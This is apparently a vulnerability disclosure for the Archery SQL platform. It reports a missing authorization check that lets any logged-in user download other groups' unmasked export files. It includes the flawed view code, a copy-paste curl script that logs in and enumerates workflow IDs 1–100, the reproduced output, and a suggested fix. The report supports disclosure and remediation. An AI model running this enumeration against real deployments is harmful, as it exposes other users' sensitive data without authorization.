# Archery: unauthenticated-to-owner download enumeration via sequential workflow_id (IDOR)

**Verification: DYNAMICALLY-REPRODUCED** (full chain over real HTTP against a live Archery instance; output below is from the actual run)

## Reproduction conditions

- Archery source (current main era snapshot), Django 5.0, Python 3.13, WSL2 Ubuntu 24.04; MySQL 8 + Redis 7 via docker; `runserver` + `qcluster`
- Two resource groups (`groupA`/`groupB`), two regular users: `attackerA` (groupA), `victimB` (groupB); one MySQL instance associated **only with groupB**; one completed offline-download workflow owned by victimB with its export file in storage (`storage_type=local`, `downloads/DataExportFile/`)
- The attack itself is pure HTTP as the low-privilege attackerA — victim state (users/groups/workflow/file) was seeded through the product's own models and storage class

## Description

`offline_file_download` (`sql/offlinedownload.py:510`) serves the export file of any `SqlWorkflow`:

```python
workflow_id = request.GET.get("workflow_id", " ")
...
workflow = SqlWorkflow.objects.get(id=workflow_id)   # no owner, no resource-group check
file_name = workflow.file_name
...
return StorageFileResponse(file, storage=storage)     # full file content
```

The view has no `@login_required` (the global `CheckLoginMiddleware` makes it login-only) and **no authorization of any kind**: `workflow_id` is a sequential auto-increment integer, so any authenticated user — regardless of resource group — can enumerate and download **every other user's** offline export files.

## Impact

Cross-user/cross-group disclosure of exported query results. Because the offline export path writes **unmasked** data (see the companion finding), these files contain the raw sensitive columns that the platform's masking feature is supposed to protect — turning this IDOR into a full sensitive-data disclosure for any regular account.

## PoC (copy-paste ready)

```bash
# 1. login as a low-privilege user of groupA (any regular account works)
CSRF=$(curl -s -c c.txt http://HOST:9123/login/ | grep -o 'csrfmiddlewaretoken" value="[^"]*' | head -1 | cut -d'"' -f3)
curl -s -b c.txt -c c.txt -X POST http://HOST:9123/authenticate/ \
  --data-urlencode "csrfmiddlewaretoken=$CSRF" \
  --data-urlencode "username=attackerA" --data-urlencode "password=..." \
  -H "Referer: http://HOST:9123/login/"

# 2. enumerate: victim's workflow belongs to another user in another resource group
for id in $(seq 1 100); do
  curl -s -b c.txt -o wf_$id "http://HOST:9123/downloadfile/?workflow_id=$id"
done
```

## Execution result (actual run)

```
seed: groups groupA/groupB; victimB->groupB, attackerA->groupA
      instance victim-mysql (id=1) associated with groupB ONLY
      workflow id=1 (victimB, file victim_export_9d8e.csv in storage)

=== attackerA login over HTTP ===
POST /authenticate/ -> {"status": 0, "msg": "ok", "data": null}

=== IDOR download ===
GET /downloadfile/?workflow_id=1 as attackerA -> HTTP 200
--- downloaded body ---
phone
13812345678
13987654321
SECRET-ROWS-OF-GROUPB
RESULT: REPRODUCED — attackerA(groupA) downloaded victimB's(groupB) export file
```

## Suggested fix

Validate that the requesting user may access the workflow: same resource group via `user_groups(request.user)` membership of `workflow.group_name` (or make workflows owner-keyed), and reject otherwise.
